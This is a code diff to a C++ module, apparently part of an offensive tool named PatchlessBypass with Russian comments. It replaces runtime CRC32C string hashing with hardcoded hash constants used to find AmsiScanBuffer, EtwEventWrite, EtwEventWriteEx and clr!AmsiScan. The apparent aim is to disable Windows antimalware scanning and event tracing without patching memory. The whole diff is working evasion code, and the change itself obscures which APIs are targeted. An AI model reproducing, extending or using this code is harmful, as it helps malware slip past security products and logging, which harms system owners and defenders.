@@ -16,6 +16,15 @@
 
 namespace PatchlessBypass
 {
+    // Pre-computed CRC32C hash constants
+    static constexpr DWORD HASH_NtQuerySystemInformation = 0x4866DF3C;
+    static constexpr DWORD HASH_VirtualFree              = 0xC21C378D;
+    static constexpr DWORD HASH_AmsiScanBuffer           = 0xBEB2C84D;
+    static constexpr DWORD HASH_EtwEventWrite            = 0xC012A0B5;
+    static constexpr DWORD HASH_EtwEventWriteEx          = 0xECF120DA;
+    static constexpr DWORD HASH_ClrDll                   = 0xEC71F996;
+    static constexpr DWORD HASH_AmsiScan                 = 0x0796D43D;
+
     // ═══ Статические переменные ═══
     static PVOID  s_AmsiAddr     = nullptr;   // amsi!AmsiScanBuffer
     static PVOID  s_EtwAddr      = nullptr;   // ntdll!EtwEventWrite
@@ -105,7 +114,7 @@ namespace PatchlessBypass
         HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
         if (!hNtdll) return false;
 
-        constexpr DWORD hashQSI = Crc32C::ConstHash("NtQuerySystemInformation");
+        constexpr DWORD hashQSI = 0x4866DF3C;  // NtQuerySystemInformation
         typedef NTSTATUS(NTAPI* fnNtQSI)(ULONG, PVOID, ULONG, PULONG);
         fnNtQSI pQSI = (fnNtQSI)Api::GetProcByHashCrc(hNtdll, hashQSI);
         if (!pQSI) return false;
@@ -129,7 +138,7 @@ namespace PatchlessBypass
         {
             // Освобождаем буфер
             auto pVF = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD))
-                Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("VirtualFree"));
+                Api::GetProcByHashCrc(hK32, 0xC21C378D);  // VirtualFree
             if (pVF) pVF(infoBuf, 0, MEM_RELEASE);
             return false;
         }
@@ -158,7 +167,7 @@ namespace PatchlessBypass
 
         // Освобождаем буфер
         auto pVF = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD))
-            Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("VirtualFree"));
+            Api::GetProcByHashCrc(hK32, HASH_VirtualFree);
         if (pVF) pVF(infoBuf, 0, MEM_RELEASE);
 
         return found;
@@ -339,7 +348,7 @@ namespace PatchlessBypass
         if (hAmsi)
         {
             // Ищем AmsiScanBuffer через CRC32C
-            constexpr DWORD hashAmsiScanBuffer = Crc32C::ConstHash("AmsiScanBuffer");
+            constexpr DWORD hashAmsiScanBuffer = 0xBEB2C84D;  // AmsiScanBuffer
             FARPROC pAmsiScan = Api::GetProcByHashCrc(hAmsi, hashAmsiScanBuffer);
             s_AmsiAddr = (PVOID)pAmsiScan;
         }
@@ -348,11 +357,11 @@ namespace PatchlessBypass
         HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
         if (hNtdll)
         {
-            constexpr DWORD hashEtwEventWrite = Crc32C::ConstHash("EtwEventWrite");
+            constexpr DWORD hashEtwEventWrite = 0xC012A0B5;  // EtwEventWrite
             s_EtwAddr = (PVOID)Api::GetProcByHashCrc(hNtdll, hashEtwEventWrite);
 
             // EtwEventWriteEx — опционально (может отсутствовать на старых Windows)
-            constexpr DWORD hashEtwEventWriteEx = Crc32C::ConstHash("EtwEventWriteEx");
+            constexpr DWORD hashEtwEventWriteEx = 0xECF120DA;  // EtwEventWriteEx
             s_EtwExAddr = (PVOID)Api::GetProcByHashCrc(hNtdll, hashEtwEventWriteEx);
         }
 
@@ -494,7 +503,7 @@ namespace PatchlessBypass
         if (!s_RetGadget) return false;   // Need ret gadget from main Enable()
 
         // Resolve clr.dll — it should already be loaded by CLR init
-        HMODULE hClr = Api::GetModuleByHashCrc(Crc32C::ConstHash("clr.dll"));
+        HMODULE hClr = Api::GetModuleByHashCrc(0xEC71F996);  // clr.dll
         if (!hClr)
         {
             // Try loading it explicitly
@@ -514,7 +523,7 @@ namespace PatchlessBypass
         if (!hClr) return false;
 
         // Find clr!AmsiScan
-        constexpr DWORD hashAmsiScan = Crc32C::ConstHash("AmsiScan");
+        constexpr DWORD hashAmsiScan = 0x0796D43D;  // AmsiScan
         s_ClrAmsiAddr = (PVOID)Api::GetProcByHashCrc(hClr, hashAmsiScan);
         if (!s_ClrAmsiAddr) return false;
 
